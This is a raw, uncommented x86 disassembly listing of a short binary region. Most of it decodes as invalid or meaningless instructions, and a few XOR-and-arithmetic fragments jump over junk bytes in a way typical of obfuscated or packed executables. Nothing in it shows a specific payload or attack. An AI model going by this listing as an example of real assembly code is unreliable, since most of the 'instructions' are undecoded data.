  40940b:	lods   eax,DWORD PTR ds:[esi]
  40940c:	(bad)  
  40940e:	jmp    0x4093bb
  409410:	or     cl,BYTE PTR [edi]
  409412:	pushfw 
  409414:	out    dx,al
  409415:	test   DWORD PTR [bp+si],ebp
  409418:	bound  edi,QWORD PTR [ecx+0xf5ff1dd]
  40941e:	scas   eax,DWORD PTR es:[edi]
  40941f:	xlat   BYTE PTR ds:[ebx]
  409420:	jmp    0x409634
  409425:	clc    
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx-0x1745e013]
  409433:	es push 0xfffffffe
  409436:	fdiv   DWORD PTR [eax+0x70]
  409439:	imul   edi,DWORD PTR [edi+0x70],0x23abb370
  409440:	or     al,0x2c
  409442:	add    edi,DWORD PTR [edx+0x66]
  409445:	mov    eax,ds:0x697a22e
  40944a:	jge    0x409414
  40944c:	sbb    edi,DWORD PTR [edi+0x56]
  40944f:	(bad)  
  409450:	(bad)  
  409451:	or     eax,0xd025bb77
  409456:	mov    dh,0x9f
  409458:	jle    0x40942d
  40945a:	call   0x9027fa2
  40945f:	fnstsw WORD PTR [ebx]
  409461:	repz adc eax,0x8c890c3a
  409467:	fisubr WORD PTR [esi+0x76]
  40946a:	mov    dl,0x50
  40946c:	jmp    0x409436
  40946e:	and    DWORD PTR [eax],ecx
  409470:	jae    0x409457
  409472:	mov    bh,0x86
  409474:	js     0x4094ba
  409476:	push   eax
  409477:	xor    al,0xde
  409479:	loop   0x409463
  40947b:	mov    edi,0xb7c64c6d
  409480:	cmc    
  409481:	mov    ch,0x1d
  409483:	mov    ah,0xf5
  409485:	retf   0xf9ef
  409488:	sub    DWORD PTR [edx-0x2ad056e2],eax
  40948e:	(bad)  
  40948f:	in     eax,dx
  409490:	scas   al,BYTE PTR es:[edi]
  409491:	mov    al,0x73
  409493:	push   cs
  409494:	test   eax,0x53fbd5f5
  409499:	pop    edx
  40949a:	jae    0x409508
  40949c:	aam    0x8a
  40949e:	push   cs
  40949f:	icebp  
  4094a0:	sti    
  4094a1:	jns    0x4094c7
  4094a3:	pop    eax
  4094a4:	ret    
  4094a5:	adc    eax,DWORD PTR [edi-0x4b]
  4094a8:	dec    eax
  4094a9:	add    BYTE PTR [edx+edx*2],cl
  4094ac:	mov    eax,0x796e8626
  4094b1:	lds    ebp,FWORD PTR [esp+eax*8-0x631dee94]
  4094b8:	mov    ds:0xf5e8a7f5,eax
  4094bd:	or     eax,0x56cade2a
  4094c2:	inc    eax
  4094c3:	clc    
  4094c4:	sub    DWORD PTR [ebx],0x5c
  4094c7:	sar    DWORD PTR [esi+0x3d],1
  4094ca:	dec    edi
  4094cb:	xchg   edi,eax
  4094cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094cd:	pop    ss
  4094ce:	lock call 0x72c8:0x8ed0d90
  4094d6:	pop    es
  4094d7:	adc    eax,0x8d7ed629
  4094dc:	fwait
  4094dd:	xchg   ebx,eax
  4094de:	mov    cl,0x85
  4094e0:	jecxz  0x40955c
  4094e2:	pop    ds
  4094e3:	mov    eax,0xe1856376
  4094e8:	outs   dx,DWORD PTR ds:[esi]
  4094e9:	and    eax,0xbafe0722
  4094ee:	std    
  4094ef:	add    al,dh
  4094f1:	sbb    edx,DWORD PTR [edi]
  4094f3:	pop    esp
  4094f4:	loopne 0x4094f5
  4094f6:	push   0x3d
  4094f8:	loop   0x4094a2
  4094fa:	pop    eax
  4094fb:	fidivr WORD PTR [edi+0x37b37bb5]
  409501:	adc    ebx,esi
  409503:	jmp    0x40955b
  409505:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409506:	cmp    eax,0x6440a981
  40950b:	repz xor BYTE PTR ss:[esi],al
  40950f:	inc    edi
  409510:	mov    ebp,0xe6f2efdf
  409515:	fdivrp st(3),st
  409517:	out    dx,al
  409518:	es mov ecx,0x4406fe56
  40951e:	xchg   esp,eax
  40951f:	addr16 pop es
  409521:	push   ds
  409522:	les    ecx,FWORD PTR [ebx+0x78]
  409525:	mov    fs,WORD PTR [eax-0x69]
  409528:	fdivr  QWORD PTR [edx+ebp*2-0x3ddf5bcd]
  40952f:	jg     0x409599
  409531:	call   0x97f2:0x4e71892d
  409538:	push   0xffffffab
  40953a:	pushw  ds
  40953c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40953d:	enter  0xd617,0xfb
  409541:	dec    eax
  409542:	cmc    
  409543:	retf   
  409544:	inc    esi
  409545:	cmp    dl,bh
  409547:	mov    gs,WORD PTR [eax-0x20]
  40954a:	adc    esp,DWORD PTR [eax+0x2c]
  40954d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40954e:	pop    esp
  40954f:	jb     0x4094f4
  409551:	jmp    0x101abda9
  409556:	inc    ecx
  409557:	push   eax
  409558:	xchg   edi,eax
  409559:	jmp    0x409506
  40955b:	int3   
  40955c:	idiv   DWORD PTR [edi-0x3aa34db7]
  409562:	and    al,0xa5
  409564:	xchg   DWORD PTR [ebp-0x54],edi
  409567:	bound  esp,QWORD PTR [ebp-0x2744f649]
  40956d:	cdq    
  40956e:	cmp    DWORD PTR [ebp-0x33397792],esi
  409574:	inc    ebp
  409575:	dec    esp
  409576:	xlat   BYTE PTR ds:[ebx]
  409577:	push   ecx
  409578:	pop    ebp
  409579:	lods   eax,DWORD PTR ds:[esi]
  40957a:	or     DWORD PTR [ecx],edi
  40957c:	rcl    al,0x36
  40957f:	pop    edx
  409580:	or     eax,DWORD PTR [ebx-0x2c]
  409583:	loope  0x40951f
  409585:	cmc    
  409586:	test   BYTE PTR [edx],cl
  409588:	les    eax,FWORD PTR [edi+eiz*2+0x29]
  40958c:	inc    ebp
  40958d:	xchg   esp,eax
  40958e:	xchg   esp,eax
  40958f:	gs ins BYTE PTR es:[edi],dx
  409591:	push   0x98edebad
  409596:	and    BYTE PTR [ecx-0x283146ef],ah
  40959c:	fstp   QWORD PTR [eax-0x80]
  40959f:	adc    ah,BYTE PTR [ebx]
  4095a1:	cld    
  4095a2:	fisttp QWORD PTR [eax]
  4095a4:	jmp    0x72e96992
  4095a9:	in     al,0xa3
  4095ab:	xchg   edx,eax
  4095ac:	cmp    dh,BYTE PTR [esi+0x72]
  4095af:	inc    edx
  4095b0:	mov    bh,BYTE PTR [ecx]
  4095b2:	adc    eax,DWORD PTR [esi+eiz*2]
  4095b5:	in     al,dx
  4095b6:	cdq    
  4095b7:	dec    eax
  4095b8:	ss pushf 
  4095ba:	out    dx,eax
  4095bb:	sub    edi,ecx
  4095bd:	push   eax
  4095be:	mov    cl,0x84
  4095c0:	ins    DWORD PTR es:[edi],dx
  4095c1:	fiadd  DWORD PTR [ecx+0x7]
  4095c4:	iret   
  4095c5:	inc    esp
  4095c6:	jne    0x40962a
  4095c8:	and    al,0x2b
  4095ca:	mov    ds:0xab27726a,al
  4095cf:	mov    ds,WORD PTR [eax-0x34468b4c]
  4095d5:	dec    esp
  4095d6:	sub    BYTE PTR [edi],cl
  4095d8:	xchg   esi,eax
  4095d9:	pop    ds
  4095da:	into   
  4095db:	mov    dh,BYTE PTR [esi-0x4af0b5de]
  4095e1:	jbe    0x409601
  4095e3:	dec    esp
  4095e4:	scas   eax,DWORD PTR es:[edi]
  4095e5:	call   0x7260:0xe88abab3
  4095ec:	mov    esi,0xcfc39422
  4095f1:	sub    BYTE PTR [eax+0x32],al
  4095f4:	mov    ah,0x7d
  4095f6:	add    BYTE PTR [edi],al
  4095f8:	rcr    DWORD PTR [ecx+0x6f],0x87
  4095fc:	hlt    
  4095fd:	push   ebx
  4095fe:	sbb    esi,ebx
  409600:	pop    esi
  409601:	mov    dl,0x47
  409603:	add    esp,DWORD PTR [edi+0x47]
  409606:	xchg   ebx,eax
  409607:	imul   BYTE PTR [edx-0x45]
  40960a:	fwait
  40960b:	int3   
  40960c:	mov    ebx,0x8de89b8d
  409611:	out    dx,eax
  409612:	and    eax,0x8bd3ff67
  409617:	dec    ebp
  409618:	loop   0x409662
  40961a:	icebp  
  40961b:	and    al,0xdf
  40961d:	cld    
  40961e:	sub    dl,ch
  409620:	push   esi
  409621:	pop    ss
  409622:	test   DWORD PTR [edi+0x2e],eax
  409625:	test   edi,esi
  409627:	mov    bl,0x5c
  409629:	mov    eax,ds:0xc95710c9
  40962e:	lahf   
  40962f:	xor    al,BYTE PTR [edi]
  409631:	xchg   edi,eax
  409632:	adc    eax,0xec5503c7
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	cmp    DWORD PTR [edx],edx
  409655:	dec    esp
  409656:	xchg   edi,esi
  409658:	out    0x70,al
  40965a:	jo     0x4096c5
  40965c:	jg     0x4096ce
  40965e:	jo     0x409661
  409660:	dec    esi
  409661:	js     0x409606
  409663:	adc    al,0xd2
  409665:	mov    dl,BYTE PTR [edx-0x3c]
  409668:	stc    
  409669:	add    al,0x58
  40966b:	popa   
  40966c:	push   ds
  40966d:	imul   DWORD PTR [edx+0x6e02797a]
  409673:	out    0xb1,al
  409675:	xor    eax,0x599d0869
  40967a:	mov    ch,0xd2
  40967c:	dec    ebp
  40967d:	sbb    esi,edi
  40967f:	pop    ebx
  409680:	cmp    bh,BYTE PTR [esi+0x28]
  409683:	inc    ecx
  409684:	iret   
  409685:	call   DWORD PTR [ebp-0x4b53ed43]
  40968b:	xrelease xchg BYTE PTR ds:0x88da622d,bh
  409692:	icebp  
  409693:	cmp    eax,0x6de85e80
  409698:	ss xchg ecx,eax
  40969a:	ret    0xa112
  40969d:	mov    ebx,0x3427e436
  4096a2:	or     al,0x71
  4096a4:	mov    al,ds:0xeb1ba903
  4096a9:	sub    al,0x88
  4096ab:	mov    eax,0x5c74f1a4
  4096b0:	jle    0x409707
  4096b2:	xor    dh,BYTE PTR [ecx]
  4096b4:	mov    edx,DWORD PTR [esi-0x44c8fa0a]
  4096ba:	(bad)  
  4096bb:	icebp  
  4096bc:	inc    esi
  4096bd:	mov    ebx,0x7ac88105
  4096c2:	mov    ch,0xcb
  4096c4:	ret    0x8057
  4096c7:	cdq    
  4096c8:	test   al,0x7c
  4096ca:	jbe    0x4096f6
  4096cc:	fmul   QWORD PTR [ebp+0x2b]
  4096cf:	cmp    al,0x5
  4096d1:	pop    ebx
  4096d2:	gs test eax,0xdd6365c3
  4096d8:	sbb    ch,BYTE PTR [edx+0x3a0a9c7b]
  4096de:	(bad)  
  4096df:	jmp    0x40971d
  4096e1:	fisttp QWORD PTR [ecx+0x701725ff]
  4096e7:	push   eax
  4096e8:	mov    ebp,0x2d5b2fde
  4096ed:	enter  0xf129,0xf0
  4096f1:	mov    WORD PTR [ebx-0x6a],cs
  4096f4:	jge    0x4096b9
  4096f6:	out    dx,eax
  4096f7:	(bad)  
  4096f8:	add    al,0xfe
  4096fa:	mov    ds:0xde1d8737,al
  4096ff:	lods   eax,DWORD PTR ds:[esi]
  409700:	jecxz  0x409709
  409702:	icebp  
  409703:	sub    dl,0x1
  409706:	and    ch,BYTE PTR [eax+0xf]
  409709:	loopne 0x4096e4
  40970b:	or     ch,BYTE PTR ds:0x32d4dbac
  409711:	and    ebp,ecx
  409713:	add    al,0x92
  409715:	leave  
  409716:	pop    esi
  409717:	jp     0x409760
  409719:	push   es
  40971a:	fld    DWORD PTR [edi+edi*1]
  40971d:	pop    ss
  40971e:	and    eax,0xb8b8a1ae
  409723:	sahf   
  409724:	fisubr DWORD PTR [ecx-0x1a]
  409727:	rcl    cl,1
  409729:	and    edx,DWORD PTR [esi]
  40972b:	xor    al,BYTE PTR [ebp-0x4e]
  40972e:	sahf   
  40972f:	repz push 0xffffffed
  409732:	inc    ecx
  409733:	fistp  QWORD PTR [eax]
  409735:	js     0x4096d9
  409737:	mov    esp,?
  409739:	js     0x409704
  40973b:	cmp    dh,BYTE PTR [edx]
  40973d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40973e:	cs test bh,bh
  409741:	outs   dx,BYTE PTR ds:[esi]
  409742:	sub    eax,0x5c04f00a
  409747:	inc    esi
  409748:	icebp  
  409749:	sub    ah,BYTE PTR [edx+eax*2-0x34]
  40974d:	fsubrp st(3),st
  40974f:	retf   0x2934
  409752:	stos   DWORD PTR es:[edi],eax
  409753:	repz test BYTE PTR [eax-0x1572ed1],cl
  40975a:	jl     0x4097ab
  40975c:	xchg   edi,eax
  40975d:	call   0x7c5f:0x6e604485
  409764:	test   BYTE PTR [ebp-0x3f],ah
  409767:	cmp    BYTE PTR [ebx+0x4b],0xd5
  40976b:	mov    cl,0x94
  40976d:	jl     0x409706
  40976f:	pminsw mm2,QWORD PTR [esi]
  409772:	sub    eax,ebp
  409774:	int    0xef
  409776:	scas   eax,DWORD PTR es:[edi]
  409777:	or     cl,BYTE PTR [ebp+0x49df61d4]
  40977d:	in     eax,dx
  40977e:	scas   al,BYTE PTR es:[edi]
  40977f:	sahf   
  409780:	mov    edx,0x4708db5b
  409785:	lds    edi,FWORD PTR [ecx]
  409787:	(bad)  
  409788:	inc    ebx
  409789:	and    BYTE PTR [ebx+ebp*4],ch
  40978c:	cdq    
  40978d:	test   BYTE PTR [ebp+0x71983f9f],cl
  409793:	sbb    DWORD PTR [edx-0x7f],ebx
  409796:	ficom  WORD PTR es:[edi+ecx*1+0x1427de65]
  40979e:	jle    0x409746
  4097a0:	mov    bl,0xa2
  4097a2:	sbb    DWORD PTR [edi+eax*2+0x46],eax
  4097a6:	(bad)  
  4097a8:	mov    DWORD PTR [esi-0x79c7cad3],edi
  4097ae:	mul    DWORD PTR [ebx]
  4097b0:	and    edi,ebp
  4097b2:	ins    BYTE PTR es:[edi],dx
  4097b3:	int3   
  4097b4:	shl    BYTE PTR [ebx],0x7e
  4097b7:	int    0x74
  4097b9:	sbb    BYTE PTR [eax],0x57
  4097bc:	sub    al,0x28
  4097be:	mov    ecx,0x3b34be34
  4097c3:	sti    
  4097c4:	icebp  
  4097c5:	pop    edx
  4097c6:	in     al,0x95
  4097c8:	fist   DWORD PTR [ecx]
  4097ca:	cwde   
  4097cb:	arpl   cx,di
  4097cd:	loope  0x4097c8
  4097cf:	fldcw  WORD PTR [edi+0x31]
  4097d2:	pop    ebx
  4097d3:	jmp    0xe432c5c6
  4097d8:	ja     0x40982a
  4097da:	mov    ah,BYTE PTR [ebp+eiz*2+0x52]
  4097de:	jo     0x409760
  4097e0:	scas   al,BYTE PTR es:[edi]
  4097e1:	pop    ebx
  4097e2:	retf   0x35b4
  4097e5:	push   edi
  4097e6:	or     DWORD PTR [edx],ebx
  4097e8:	and    esp,esp
  4097ea:	mov    bl,0x36
  4097ec:	lds    esi,FWORD PTR [eax]
  4097ee:	cs add cl,ah
  4097f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097f2:	sub    DWORD PTR [eax+0x34],ebx
  4097f5:	push   cs
  4097f6:	and    esp,DWORD PTR [esi-0x68df12a3]
  4097fc:	fcompp 
  4097fe:	mov    bh,0x99
  409800:	out    0x41,eax
  409802:	xor    ebx,DWORD PTR [esi+0x2c]
  409805:	dec    eax
  409806:	in     eax,0xc3
  409808:	shr    ch,0x5c
  40980b:	ins    DWORD PTR es:[edi],dx
  40980c:	mov    ds:0xd473c021,al
  409811:	pop    ss
  409812:	fwait
  409813:	sar    DWORD PTR [eax-0x4],0xdb
  409817:	cmp    bl,al
  409819:	gs xor esi,eax
  40981c:	mov    DWORD PTR [edx],edx
  40981e:	push   edx
  40981f:	jbe    0x409806
  409821:	out    0x3a,al
  409823:	dec    esp
  409824:	in     al,dx
  409825:	cmp    BYTE PTR [edi+ebx*4],0xa6
  409829:	sbb    eax,0x63212ee9
  40982e:	test   al,cl
  409830:	mov    ebx,0xb026294f
  409835:	shl    al,1
  409837:	aas    
  409838:	mov    WORD PTR [edi],?
  40983a:	push   ebp
  40983b:	inc    ebx
  40983c:	fadd   DWORD PTR [edx+0x54d05aae]
  409842:	out    dx,al
  409843:	repz fdiv QWORD PTR [esi+0x4b]
  409847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409848:	dec    eax
  409849:	mov    ebx,0x95862b8c
  40984e:	add    eax,0x25c9e993
  409853:	push   ebp
  409854:	mov    ecx,0xfd1035b
  409859:	scas   eax,DWORD PTR es:[edi]
  40985a:	xlat   BYTE PTR ds:[ebx]
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0xfc7bf628
  40989a:	loope  0x409874
  40989c:	and    eax,0x697070e4
  4098a2:	jg     0x409914
  4098a4:	jo     0x409895
  4098a6:	leave  
  4098a7:	scas   eax,DWORD PTR es:[edi]
  4098a8:	adc    al,0xeb
  4098aa:	add    edx,esp
  4098ac:	and    DWORD PTR [edx-0x727f6ee2],ebx
  4098b2:	cwde   
  4098b3:	ret    0x55be
  4098b6:	fisub  WORD PTR [edi]
  4098b8:	sbb    ebp,DWORD PTR [ebx+esi*8+0x5a]
  4098bc:	mov    fs,WORD PTR [edi]
  4098be:	je     0x40986b
  4098c0:	xor    edx,DWORD PTR [edx-0x6d]
  4098c3:	sub    esi,DWORD PTR [ecx+0x53]
  4098c6:	sub    ch,BYTE PTR [esi+edx*8]
  4098c9:	jne    0x40989f
  4098cb:	ss ins BYTE PTR es:[edi],dx
  4098cd:	rol    DWORD PTR [ecx-0x3ec8bd97],0xe6
  4098d4:	enter  0xf63b,0xc1
  4098d8:	pusha  
  4098d9:	sbb    al,0x32
  4098db:	mov    al,ds:0x894fbaa8
  4098e0:	inc    ebx
  4098e1:	add    DWORD PTR [ebp+edx*8+0x2f],eax
  4098e5:	int3   
  4098e6:	pop    es
  4098e7:	mov    eax,0xdc13f318
  4098ec:	mov    edx,0xce14486e
  4098f1:	mul    DWORD PTR [edi+0x45]
  4098f4:	cdq    
  4098f5:	mov    ecx,0x21e9b0e4
  4098fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098fb:	ins    BYTE PTR es:[edi],dx
  4098fc:	mov    ecx,0x48cac220
  409901:	mov    esi,DWORD PTR [edi+0x7c]
  409904:	jno    0x409984
  409906:	sub    eax,0xec1fe487
  40990b:	push   esi
  40990c:	fistp  DWORD PTR [eax]
  40990e:	xor    cl,BYTE PTR [ecx]
  409910:	xor    ch,0xc0
  409913:	pop    esp
  409914:	mov    ecx,0x32c62d5d
  409919:	test   BYTE PTR [edi],al
  40991b:	lods   al,BYTE PTR ds:[esi]
  40991c:	shl    BYTE PTR [edi+eax*2-0x167086e],cl
  409923:	mov    ecx,0x546d23c7
  409928:	imul   edx,DWORD PTR [edx+0x7],0x60
  40992c:	fld    DWORD PTR [esi-0x45fcf995]
  409932:	jno    0x40992f
  409934:	aaa    
  409935:	add    BYTE PTR [esi+0x72],0xbc
  409939:	mov    edi,0x8393f8af
  40993e:	mov    edi,0x50446ca5
  409943:	push   es
  409944:	out    0x36,eax
  409946:	pop    ecx
  409947:	lea    eax,[edx+0x4b67134e]
  40994d:	lea    ebp,ds:0xae9f2a37
  409953:	sub    dl,ch
  409955:	es jmp 0x4224:0x64bd585e
  40995d:	stos   DWORD PTR es:[edi],eax
  40995e:	popf   
  40995f:	ret    
  409960:	push   eax
  409961:	ins    BYTE PTR es:[edi],dx
  409962:	push   edi
  409963:	aaa    
  409964:	mov    bl,BYTE PTR [esi]
  409966:	popa   
  409967:	push   esi
  409968:	test   DWORD PTR [ecx-0x33],ebp
  40996b:	out    0x92,al
  40996d:	mov    eax,ds:0x151a8246
  409972:	loope  0x409943
  409974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409975:	outs   dx,BYTE PTR ds:[esi]
  409976:	push   ebx
  409977:	(bad)  
  409978:	pop    edi
  409979:	psllq  mm3,mm5
  40997c:	(bad)  
  40997d:	mov    ecx,0xdf3ffab0
  409982:	add    ebp,ebx
  409984:	xor    ebx,DWORD PTR [edi-0x2c]
  409987:	xchg   ebx,eax
  409988:	dec    ebx
  409989:	and    al,BYTE PTR [edx-0x7c]
  40998c:	nop
  40998d:	or     BYTE PTR ds:0x8310bdb7,bl
  409993:	pop    esi
  409994:	pushf  
  409995:	lods   eax,DWORD PTR ds:[esi]
  409996:	add    eax,0x3579d60e
  40999b:	cdq    
  40999c:	js     0x4099e8
  40999e:	ins    DWORD PTR es:[edi],dx
  40999f:	jmp    0xc227:0xa4632bf7
  4099a6:	and    eax,0x7b7f150f
  4099ab:	(bad)  
  4099ac:	fmul   QWORD PTR [eax+0x7a]
  4099af:	in     al,dx
  4099b0:	push   esi
  4099b1:	jno    0x4099a3
  4099b3:	stc    
  4099b4:	dec    esi
  4099b5:	push   edi
  4099b6:	jbe    0x4099b9
  4099b8:	jb     0x4099e4
  4099ba:	adc    esp,DWORD PTR [ebx+0x25096215]
  4099c0:	cmp    dh,dl
  4099c2:	cmc    
  4099c3:	js     0x40998e
  4099c5:	leave  
  4099c6:	mov    ebx,0xbb8d914a
  4099cb:	mov    edi,0x704e880b
  4099d0:	js     0x4099cf
  4099d2:	ins    DWORD PTR es:[edi],dx
  4099d3:	int    0x5d
  4099d5:	jge    0x4099d1
  4099d7:	mov    esp,0x61375b5f
  4099dc:	mov    dh,0x34
  4099de:	push   ecx
  4099df:	pop    ss
  4099e0:	test   al,0xbb
  4099e2:	retf   0xaff8
  4099e5:	test   DWORD PTR [edx+0x53],eax
  4099e8:	call   0xf82:0xeb8f44a5
  4099ef:	sub    al,0xed
  4099f1:	cmp    edx,DWORD PTR [esi+ebx*4-0xb]
  4099f5:	icebp  
  4099f6:	in     eax,dx
  4099f7:	push   es
  4099f8:	jae    0x409a73
  4099fa:	les    esp,FWORD PTR [edx]
  4099fc:	and    eax,0xef40793e
  409a01:	pop    edx
  409a02:	or     edi,0xffffffff
  409a05:	inc    edi
  409a06:	add    al,BYTE PTR [ebp-0x7ede65c8]
  409a0c:	xor    al,0xe4
  409a0e:	mov    edi,0x99ef944
  409a13:	mov    eax,ds:0xd3fe863f
  409a18:	js     0x4099e6
  409a1a:	or     al,0xf3
  409a1c:	jmp    0xa0f1543
  409a21:	loop   0x409a0a
  409a23:	out    dx,al
  409a24:	push   ebp
  409a25:	daa    
  409a26:	add    edx,DWORD PTR [ecx-0x6b42fa4a]
  409a2c:	loope  0x409a36
  409a2e:	mov    ebp,0xc6f32ba0
  409a33:	loopne 0x409a0e
  409a35:	push   esp
  409a36:	aaa    
  409a37:	sbb    BYTE PTR [ebx+0x57b216f5],dl
  409a3d:	mov    cl,0x32
  409a3f:	fidiv  WORD PTR [esi]
  409a41:	in     eax,dx
  409a42:	mov    ebx,ebp
  409a44:	mov    esi,0xe75f3c71
  409a49:	mul    bl
  409a4b:	mov    BYTE PTR [ecx],cl
  409a4d:	pop    es
  409a4e:	add    ch,bh
  409a50:	inc    edx
  409a51:	inc    esp
  409a52:	pop    ds
  409a53:	in     eax,0x25
  409a55:	sub    DWORD PTR ds:0xa65a21b8,0xfffffff2
  409a5c:	cmp    DWORD PTR [eax-0x36fddea2],ebp
  409a62:	cmp    DWORD PTR [ebx+0x32],esp
  409a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a66:	loop   0x4099ef
  409a68:	pop    esp
  409a69:	mov    edx,0xdee59454
  409a6e:	gs mov ecx,0xbe13245f
  409a74:	out    dx,eax
  409a75:	xchg   BYTE PTR [ecx+0x2d1ae6c],bl
  409a7b:	and    al,0xcc
  409a7d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  409a7f:	mov    ds:0x707d82df,eax
  409a84:	xchg   DWORD PTR [ebx+edx*1],edx
  409a87:	fld    DWORD PTR [ecx]
  409a89:	xchg   edx,eax
  409a8a:	push   es
  409a8b:	pop    eax
  409a8c:	and    ch,BYTE PTR [ecx-0x749a8a17]
  409a92:	aad    0xf5
  409a94:	out    dx,eax
  409a95:	jle    0x409a82
  409a97:	out    dx,eax
  409a98:	push   eax
  409a99:	xchg   ebp,eax
  409a9a:	mov    esi,0xdc7d8b3f
  409a9f:	xor    edx,eax
  409aa1:	add    edx,ecx
  409aa3:	imul   edx,edi
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    al,BYTE PTR [edi-0x26613e64]
  409ad3:	loop   0x409b45
  409ad5:	jo     0x409b40
  409ad7:	jg     0x409b49
  409ad9:	jo     0x409a5f
  409adb:	xchg   ecx,eax
  409adc:	xchg   DWORD PTR [ebx+0x71],edx
  409adf:	add    DWORD PTR [esi-0x5a534b59],edi
  409ae5:	jne    0x409aff
  409ae7:	idiv   DWORD PTR [ebp-0x64602b19]
  409aed:	sbb    al,0x85
  409aef:	lahf   
  409af0:	jne    0x409b28
  409af2:	add    al,0x95
  409af4:	sbb    al,0xe7
  409af6:	out    dx,al
  409af7:	imul   BYTE PTR [ecx+ebp*8]
  409afa:	int    0xd5
  409afc:	mov    ebx,esi
  409afe:	cmp    ah,BYTE PTR [ebx+ebx*2+0x5afafe0e]
  409b05:	mov    edi,0x954e0214
  409b0a:	fidivr DWORD PTR [ebx]
  409b0c:	pop    ecx
  409b0d:	fcomp  DWORD PTR [esi+0x30a3063c]
  409b13:	(bad)  
  409b15:	mov    esi,0x632d1d9b
  409b1a:	push   edi
  409b1b:	mov    ecx,0x9393155b
  409b20:	pop    ds
  409b21:	cwde   
  409b22:	retf   0x7e68
  409b25:	scas   al,BYTE PTR es:[edi]
  409b26:	push   eax
  409b27:	push   ecx
  409b28:	mov    ebp,0x1ff529f1
  409b2d:	(bad)  
  409b2f:	mov    edx,0xe740fe62
  409b34:	xor    eax,0x78e2d962
  409b39:	stos   DWORD PTR es:[edi],eax
  409b3a:	push   eax
  409b3b:	daa    
  409b3c:	sbb    al,0x5
  409b3e:	mov    ecx,ebx
  409b40:	jbe    0x409b80
  409b42:	lahf   
  409b43:	shr    BYTE PTR [esi],1
  409b45:	fisub  DWORD PTR [edx]
  409b47:	dec    edi
  409b48:	shr    BYTE PTR [edx-0x1f],0x13
  409b4c:	or     cl,BYTE PTR [ecx]
  409b4e:	cld    
  409b4f:	push   edi
  409b50:	inc    ebp
  409b51:	xchg   DWORD PTR [ebp+0x67],esp
  409b54:	test   eax,0x7528defb
  409b59:	cwde   
  409b5a:	jmp    FWORD PTR [edx+0x3ee84c9]
  409b60:	ins    BYTE PTR es:[edi],dx
  409b61:	icebp  
  409b62:	hlt    
  409b63:	cmp    eax,0x125eef96
  409b68:	loop   0x409b0f
  409b6a:	test   eax,0x271506d7
  409b6f:	scas   al,BYTE PTR es:[edi]
  409b70:	es mov esi,0x970db7ba
  409b76:	xchg   esi,eax
  409b77:	jle    0x409b0c
  409b79:	mov    ah,0xcf
  409b7b:	and    bl,dl
  409b7d:	add    ebx,ebx
  409b7f:	mov    ah,0xaf
  409b81:	ins    DWORD PTR es:[edi],dx
  409b82:	sub    eax,0xa6c230b5
  409b87:	push   0xd01731a7
  409b8c:	pop    ebx
  409b8d:	or     ah,bh
  409b8f:	popf   
  409b90:	stos   BYTE PTR es:[edi],al
  409b91:	cmp    ebp,ebx
  409b93:	add    eax,0xe2834adc
  409b98:	dec    ebx
  409b99:	jns    0x409b95
  409b9b:	gs inc ebx
  409b9d:	cmp    eax,0x943bf144
  409ba2:	(bad)  
  409ba3:	les    ebx,FWORD PTR [eax]
  409ba5:	out    dx,al
  409ba6:	les    ecx,FWORD PTR [esi]
  409ba8:	mov    ch,0x76
  409baa:	xchg   DWORD PTR [ebp+0x6653d11e],ebp
  409bb0:	out    dx,al
  409bb1:	test   ebx,ebx
  409bb3:	push   ebx
  409bb4:	in     al,dx
  409bb5:	cmp    eax,0x833044f5
  409bba:	mov    ch,0xa4
  409bbc:	jecxz  0x409b45
  409bbe:	inc    ebp
  409bbf:	push   esi
  409bc0:	test   al,0xba
  409bc2:	int3   
  409bc3:	std    
  409bc4:	pop    esi
  409bc5:	neg    DWORD PTR [bx+si+0x3bde]
  409bca:	sub    DWORD PTR [ebx+edx*1],esp
  409bcd:	sub    DWORD PTR [ecx+0x2c83dc16],ebx
  409bd3:	sbb    ch,BYTE PTR [edi]
  409bd5:	addr16 leave 
  409bd7:	dec    esp
  409bd8:	in     eax,dx
  409bd9:	mov    edx,0x82d69c02
